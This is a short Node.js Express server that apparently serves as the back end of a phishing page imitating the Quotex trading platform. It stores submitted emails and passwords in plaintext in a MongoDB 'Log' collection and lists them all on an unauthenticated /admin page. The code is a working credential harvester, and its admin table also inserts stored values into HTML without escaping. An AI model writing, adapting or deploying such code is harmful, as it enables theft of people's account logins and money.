const express = require('express');
const mongoose = require('mongoose');
const path = require('path');

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// MongoDB Connection
mongoose.connect('mongodb://localhost:27017/quotex')
  .then(() => {
    console.log('MongoDB connected');
  })
  .catch((err) => {
    console.error('MongoDB connection error:', err);
  });

// Schema
const logSchema = new mongoose.Schema({
  email: String,
  password: String,
  time: String
});

const Log = mongoose.model('Log', logSchema);

// Static files
app.use(express.static(__dirname));

// Home Page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Save Data
app.post('/submit', async (req, res) => {
  try {
    const { email, password, time } = req.body;

    const newLog = new Log({
      email,
      password,
      time
    });

    await newLog.save();

    res.send('Saved Successfully');
  } catch (err) {
    console.error(err);
    res.status(500).send('Error Saving Data');
  }
});

// Admin Route
app.get('/admin', async (req, res) => {
  try {
    const logs = await Log.find().sort({ _id: -1 });

    let html = `
    <html>
    <head>
      <title>Admin Panel</title>
      <style>
        body{
          font-family: Arial, sans-serif;
          padding:20px;
        }
        table{
          border-collapse: collapse;
          width:100%;
        }
        th,td{
          border:1px solid #ccc;
          padding:10px;
          text-align:left;
        }
        th{
          background:#f2f2f2;
        }
      </style>
    </head>
    <body>
      <h2>Saved Records</h2>
      <table>
        <tr>
          <th>Email</th>
          <th>Password</th>
          <th>Time</th>
        </tr>
    `;

    logs.forEach(log => {
      html += `
      <tr>
        <td>${log.email}</td>
        <td>${log.password}</td>
        <td>${log.time}</td>
      </tr>
      `;
    });

    html += `
      </table>
    </body>
    </html>
    `;

    res.send(html);

  } catch (err) {
    console.error(err);
    res.status(500).send('Error Loading Admin Panel');
  }
});

app.listen(3000, () => {
  console.log('Server running on port 3000');
});